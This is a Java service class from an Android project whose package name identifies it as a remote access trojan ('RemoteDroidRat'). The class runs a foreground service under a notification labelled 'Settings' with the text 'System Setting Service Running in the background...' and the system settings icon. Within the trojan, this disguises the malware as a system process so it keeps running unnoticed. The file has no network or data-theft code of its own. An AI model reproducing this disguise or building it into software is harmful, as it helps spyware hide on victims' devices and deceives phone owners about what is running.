package com.KaranKumar.RemoteDroidRat.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;

public class myNotification extends Service {

    private static final String CHANNEL_ID = "settings";
    private static final int NOTIFICATION_ID = 1;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();

        // Check and request notification policy access
        if (!isNotificationPolicyAccessGranted()) {
            requestNotificationPolicyAccess();
            // You might want to handle this case appropriately, e.g., show a message to the user.
            Toast.makeText(this, "Notification policy access is required", Toast.LENGTH_SHORT).show();
            stopSelf();
            return START_NOT_STICKY;
        }

        Intent settingsIntent = new Intent(Settings.ACTION_SETTINGS);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, settingsIntent, 0);

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
			.setSmallIcon(android.R.drawable.ic_menu_manage)
			.setContentTitle("Settings")
			.setContentText("System Setting Service Running in the background...")
			.setPriority(NotificationCompat.PRIORITY_DEFAULT)
			.setContentIntent(pendingIntent);

        Notification notification = builder.build();

        // Set the service to run in the foreground
        startForeground(NOTIFICATION_ID, notification);

        return START_NOT_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "Settings";
            String description = "System Setting Service Running in the background...";
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }

    private boolean isNotificationPolicyAccessGranted() {
        NotificationManager notificationManager = getSystemService(NotificationManager.class);
        return notificationManager != null && notificationManager.isNotificationPolicyAccessGranted();
    }

    private void requestNotificationPolicyAccess() {
		Intent intent = new Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS);
		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // Add this line to set the FLAG_ACTIVITY_NEW_TASK flag
		startActivity(intent);
	}
}
